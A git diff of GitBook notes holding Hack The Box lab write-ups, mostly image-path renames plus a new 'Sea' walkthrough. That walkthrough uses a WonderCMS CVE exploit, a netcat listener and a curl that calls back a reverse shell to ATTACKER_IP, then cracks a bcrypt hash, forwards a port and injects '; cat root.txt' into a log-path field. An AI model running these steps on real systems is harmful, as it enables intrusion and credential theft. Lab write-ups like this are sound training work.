@@ -749,7 +749,7 @@ else:
 
 `cat /etc/passwd`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cd /tmp`&#x20;
 
@@ -759,7 +759,7 @@ else:
 
 `cat AdminuserLoginData.xml`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Obtained info:
 
@@ -775,7 +775,7 @@ requirePasswordChange="Y"
 
 {% embed url="https://hashes.com/en/tools/hash_identifier" %}
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 OK - it could be SHA1, but nothing valuable
 
@@ -793,7 +793,7 @@ OK - it could be SHA1, but nothing valuable
 
 **OK, some SHA is stored in c6650.dat file**
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `admin$"`**`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=`**
 
@@ -880,7 +880,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `python3 hashcsript.py`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `su root`
 
@@ -888,7 +888,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Crafty
 
@@ -898,16 +898,16 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 * nmap -sVC \<IP>
 
-<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Website
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * sudo nano /etc/hosts
   * \<IP> crafty.htb
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * subpages
   * /coming-soon
@@ -919,7 +919,7 @@ Website
 
 *
 
-    <figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -930,7 +930,7 @@ Website
 * extended nmap for higher ports
 * `nmap -sVC 10.10.11.249 -p0-65535`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * minecraft 1.16.5 Crafty server, Microsoft...
 
@@ -1040,7 +1040,7 @@ Finding vulnerability for PE
 * Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
   * F12 -> Network -> document
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Hosts
 
@@ -1060,7 +1060,7 @@ sudo nano /etc/hosts
     * get '/admin' do "Hello World" end
   * same output for any subpage it doesnt know
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -1149,7 +1149,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 * 587 SMTP
 * 993 SSL/IMAP
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### hosts
 
@@ -1165,7 +1165,7 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 #### website
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
 * "Powered by hMailServer"
   * opensource mail server for Win, AGLPv3 licence
@@ -1200,27 +1200,215 @@ The format of the password is in the /var/spool/mail/susan. You can crack it wit
 
 ### Root flag
 
-## BoardLight
+## Sea
 
 ### Reco
 
 #### nmap
 
-`nmap -sVC 10.10.11.11`&#x20;
+`nmap -sVC <IP>`&#x20;
 
 * 22 SSH
-* 80 HTTP (without redirect)
+* 80 HTTP (sea.htb)
 
-#### dirb
+#### Website
 
-* nothing valuable found
-
-
+* home&#x20;
+* how to participate
+  * contact&#x20;
+* CONTACT.PHP
+  * contact form -> Burpsuite -> **WonderCMS**
 
 ### Weaponisation
 
+WonderCMS
+
+* [https://github.com/prodigiousMind/CVE-2023-41425/tree/main](https://github.com/prodigiousMind/CVE-2023-41425/tree/main)
+  * CVE for XSS attack
+  * Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2 allows a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.
+  * get the exploit.py
+
 ### Exploitation
+
+* nc -nlvp \<ATTACKER\_PORT>
+* python3 exploit.py http://sea.htb/themes \<ATTACKER\_IP> \<ATTACKER\_PORT>
+* curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=\<ATTACKER\_IP>\&lport=\<ATTACKER\_PORT>'
+  * we obtained the revshell
+
+<figure><img src=".gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
+* cd home&#x20;
+  * cd geo -> forbidden
+  * cd amay && ls
+    * cat user.txt -> forbidden
+* whoami
+  * www-data
+
+Our goal is to obtain the PW for user to obtain user flag...lets search the folders
+
+* cd var
+  * cd www
+    * cd sea
+      * ls
+        * cd data
+          * ls
+            * cat database.js
+              * ```
+                "password": "$2y$1XXXXXXXXXXXXXXXXXXXXXXXX",
+                ```
+
+```javascript
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": false,
+        "password": "$2y$1XXXXXXXXXXXXXXXXXXXXXXXX",
+        "lastLogins": {
+            "2024\/08\/14 11:13:59": "127.0.0.1",
+            "2024\/08\/14 11:12:59": "127.0.0.1",
+            "2024\/08\/14 11:12:58": "127.0.0.1",
+            "2024\/08\/14 11:11:57": "127.0.0.1",
+            "2024\/08\/14 11:11:56": "127.0.0.1"
+        },
+        "lastModulesSync": "2024\/07\/31",
+        "customModules": {
+            "themes": {},
+            "plugins": {}
+        },
+        "menuItems": {
+            "0": {
+                "name": "Home",
+                "slug": "home",
+                "visibility": "show",
+                "subpages": {}
+            },
+            "1": {
+                "name": "How to participate",
+                "slug": "how-to-participate",
+                "visibility": "show",
+                "subpages": {}
+            }
+        },
+        "logoutToLoginScreen": {}
+    },
+    "pages": {
+        "404": {
+            "title": "404",
+            "keywords": "404",
+            "description": "404",
+            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
+            "subpages": {}
+        },
+        "home": {
+            "title": "Home",
+            "keywords": "Enter, page, keywords, for, search, engines",
+            "description": "A page description is also good for search engines.",
+            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
+            "subpages": {}
+        },
+        "how-to-participate": {
+            "title": "How to",
+            "keywords": "Enter, keywords, for, this page",
+            "description": "A page description is also good for search engines.",
+            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
+            "subpages": {}
+        }
+    },
+    "blocks": {
+        "subside": {
+            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
+        },
+        "footer": {
+            "content": "©2024 Sea"
+        }
+    }
+```
+
+Cool, we found the pw in hash form...looks like bcrypt
+
+#### Decrypt PW
+
+```bash
+sudo hashcat -a 0 -m 3200 'HASH' <rockyou.txt_dictionary_path>
+```
+
+* pwned, we obtained the PW in plain text...
+
+#### SSH (or su amay)
+
+```bash
+ssh amay@10.10.11.28
+```
+
+* PW...
+* cat user.txt
+
+<figure><img src=".gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>
+
 ### Root flag
+
+```bash
+sudo -l
+```
+
+* "Sorry, user amay may not run sudo on sea."
+
+Lets check the network traffic / open ports
+
+```bash
+netstat -an
+```
+
+* there is 8080 port also open for amay...
+  * but we cant access it directly
+    * technique: PORT FORWARDING
+
+#### Port forwarding
+
+```bash
+ssh -L [local_port]:[destination_address]:[destination_port] [username]@[ssh_server]
+
+
+# In my case
+ssh -L 8888:127.0.0.1:8080 amay@sea.htb
+
+# 8888 is randomly chosen
+```
+
+now we can access the URL: **localhost:8888**
+
+* and login with amay credentials
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* we accessed the SysMonitor under -p 8080
+  * we can analyze the log files...
+    * access.log
+    * auth.log
+* Lets do it
+  * nothing much to be seen in web browser, it is badly readable...
+
+#### Burpsuite
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+* we can modify the log file path...
+  * /root/root.txt; cat root.txt
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+* Root flag obtained :-)
+  * PWNED
